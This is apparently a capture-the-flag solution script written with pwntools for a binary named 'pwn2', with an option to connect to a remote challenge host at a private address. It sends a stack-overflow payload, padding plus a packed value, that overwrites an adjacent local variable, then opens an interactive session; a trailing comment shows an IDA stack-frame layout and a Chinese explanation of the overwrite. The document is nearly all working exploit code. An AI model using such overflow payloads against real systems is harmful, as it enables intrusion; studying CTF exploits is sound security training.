from pwn import *

s = lambda data: io.send(data)
sa = lambda delim, data: io.sendafter(str(delim), data)
sl = lambda data: io.sendline(data)
sla = lambda delim, data: io.sendlineafter(str(delim), data)
r = lambda num: io.recv(num)
ru = lambda delims, drop=True: io.recvuntil(delims, drop)
itr = lambda: io.interactive()
uu32 = lambda data: u32(data.ljust(4, b'\x00'))
uu64 = lambda data: u64(data.ljust(8, b'\x00'))
context.log_level = 'debug'
context.binary = binary = './pwn2'
gdbscript = '''
'''


def start(argv=[], *a, **kw):
    if args.GDB:
        proc = process([binary] + argv, *a, **kw)
        gdb.attach(proc, gdbscript=gdbscript)
        return proc
    elif args.REMOTE:
        return remote('10.5.101.125', 28015)
    else:
        return process([binary] + argv, *a, **kw)


elf = ELF(binary)
io = start()
sla("What's Your Birth?","1232")
ru("What's Your Name?")
pay = b'a' * (0x20-0x18)+p64(1926)
sl(pay)
itr()

'''
0000000000000020 ; D/A/*   : change type (data/ascii/array)
-0000000000000020 ; N       : rename
-0000000000000020 ; U       : undefine
-0000000000000020 ; Use data definition commands to create local variables and function arguments.
-0000000000000020 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000020 ; Frame size: 20; Saved regs: 8; Purge: 0
-0000000000000020 ;
-0000000000000020
-0000000000000020 var_20          db 8 dup(?)     这是第2次输入的参数
-0000000000000018 var_18          dd 4 dup(?)     这是第1次输入的参数

需要在第2次输入的时候覆盖第1次参数，pay = b'a' * (0x20-0x18)+p64(1926)
'''